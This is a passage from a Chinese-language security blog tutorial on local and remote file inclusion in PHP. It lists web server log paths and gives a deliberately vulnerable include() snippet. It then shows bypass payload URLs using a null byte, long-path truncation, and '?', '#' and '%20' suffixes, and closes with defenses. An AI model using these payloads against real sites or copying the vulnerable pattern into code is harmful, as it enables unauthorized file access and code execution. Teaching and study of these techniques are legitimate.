+&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access_log或者error.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="nginx"><a class="markdownIt-Anchor" href="#nginx"></a> Nginx</h4>
+<p>nginx存在两个文件日志文件，access.log是记录登录等信息的日志文件，而error.log是错误文件。</p>
+<pre class="line-numbers language-none"><code class="language-none">Windows系统：
+nginx安装目录&#x2F;logs&#x2F;access.log或者error.log
+2）linux系统：
+&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log或者error.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="iis"><a class="markdownIt-Anchor" href="#iis"></a> IIS</h4>
+<pre class="line-numbers language-none"><code class="language-none">iis6.0版本
+C:\windows\system32\LogFiles
+iis7.5版本
+%SystemDrive%\inetpub\logs\LogFiles<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="绕过方式"><a class="markdownIt-Anchor" href="#绕过方式"></a> 绕过方式</h2>
+<h4 id="本地文件包含绕过"><a class="markdownIt-Anchor" href="#本地文件包含绕过"></a> 本地文件包含绕过</h4>
+<h5 id="空字符绕过"><a class="markdownIt-Anchor" href="#空字符绕过"></a> 空字符绕过</h5>
+<ul>
+<li>
+<p>空字符绕过是存在PHP小于5.3.4版本的一个漏洞，这个漏洞就是用于接收来自路径中的空字符，这样在部分需求下攻击者可以利用将此字符放置安全文件后面来绕过访问限制。</p>
+</li>
+<li>
+<p>前提条件就是需要PHP版本小于5.3.4，并且关闭PHP魔术引导。</p>
+<blockquote>
+<p>php魔术引导介绍</p>
+<p>当sql句中含有单引号，双引号，反斜杠和NUL时，这时候如果不对这些符号进行转义，写入数据库时就会出错，而魔术引号magic_quotes_gpc()就是对这些符号进行转义以便能把数据正确写入数据库。不过该参数在php.ini文件中修改。</p>
+<p>PHP魔术引号特性已自 PHP5.3.0起废弃并将自PHP5.4.0起移除。也就是说在本实验环境的PHP版本中仍是存在的</p>
+</blockquote>
+</li>
+</ul>
+<p>eg:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$name</span><span class="token operator">=</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在正常访问中，包含的文件会在末尾加上后缀,<code>*.html，jpg</code>之类的</p>
+<p>如果这个漏洞存在</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">URL</span>：http<span class="token punctuation">:</span><span class="token comment">//192.168.10.150/1.php/?name=2.php%00</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>就可以绕过添加html的后缀，直接访问这个文件</p>
+<h5 id="超长字符绕过"><a class="markdownIt-Anchor" href="#超长字符绕过"></a> 超长字符绕过</h5>
+<p>超长字符截断就是利用操作系统对目录最大长度的限制，在Windows中目录长度不可以超过256字节，linux中目录长度不可以超过4096字节。超过的部分会被丢弃。</p>
+<p>可以使用&quot;./“进行填充，当然不单单”./“可以填充，使用”.&quot;也可以，至于还有那些可以绕过，可以自己去试试</p>
+<h4 id="远程文件包含绕过"><a class="markdownIt-Anchor" href="#远程文件包含绕过"></a> 远程文件包含绕过</h4>
+<h5 id="空字符绕过-2"><a class="markdownIt-Anchor" href="#空字符绕过-2"></a> 空字符绕过</h5>
+<p>与本地文件包含绕过类似</p>
+<h5 id="超长字符绕过-2"><a class="markdownIt-Anchor" href="#超长字符绕过-2"></a> 超长字符绕过</h5>
+<p>远程文件包含好像只能使用&quot;./“，其它的像”.“”,“”。“”：&quot;都不能绕过。</p>
+<h5 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> ?绕过</h5>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">URL</span>：http<span class="token punctuation">:</span><span class="token comment">//192.168.10.150/1.php/?name=2.php?</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h5 id="常见特殊字符编码"><a class="markdownIt-Anchor" href="#常见特殊字符编码"></a> 常见特殊字符编码</h5>
+<img src="/2024/06/30/%E5%88%9D%E8%AF%86LFI%E5%92%8CRFI/1684890987_646d656b734ed3e426965.jpeg" class="" alt="image-20230413154829444" loading="lazy">
+<h5 id="绕过-2"><a class="markdownIt-Anchor" href="#绕过-2"></a> #绕过</h5>
+<pre class="line-numbers language-none"><code class="language-none">URL：http:&#x2F;&#x2F;192.168.10.150&#x2F;1.php&#x2F;?name&#x3D;2.php%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h5 id="空格绕过"><a class="markdownIt-Anchor" href="#空格绕过"></a> 空格绕过</h5>
+<p>末尾添加%20</p>
+<h3 id="防御方式"><a class="markdownIt-Anchor" href="#防御方式"></a> 防御方式</h3>
+<ol>
+<li>设置白名单：若是在编写代码的时候能够确定文件包含的文件名的时候，那么最好使用白名单进行参数传入。</li>
+<li>过滤危险字符：由于Incbude/Require可以对PHP Wrapper形式的地址进行包含执行(需要配置php.ini)， 在Linux环境中可以通过&quot;…/…/&quot;的形式进行目录绕过，所以需要判断文件名称是否为合法的PHP文件。</li>
+<li>设置文件目录：PHP配置文件中有open_basedir选项可以设置用户需要执行的文件目录，如果设置目录的话，PHP仅仅在该目录内搜索文件。</li>
+<li>关闭危险配置：PHP配置中的allow_url_include选项如果打开，PHP会通过Include/Require进行远程文件包含，由于远程文件的不可信任性及不确定性，在开发中禁止打开此选项，PHP默认是关闭的。</li>
+</ol>
+</div></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/06/30/%E5%88%9D%E8%AF%86%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="prev" title="初识文件上传漏洞"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">初识文件上传漏洞</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/06/30/%E5%88%9D%E8%AF%86RCE/" rel="next" title="初识RCE"><span class="post-nav-text">初识RCE</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>您需要科学上网，才可使用评论区功能。</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2024/06/30/%E5%88%9D%E8%AF%86LFI%E5%92%8CRFI/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank"></a></div><div class="copyright"><span>&copy; 2022 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Npc</span></div><div class="footer-custom-text">=w=</div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="Searching..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
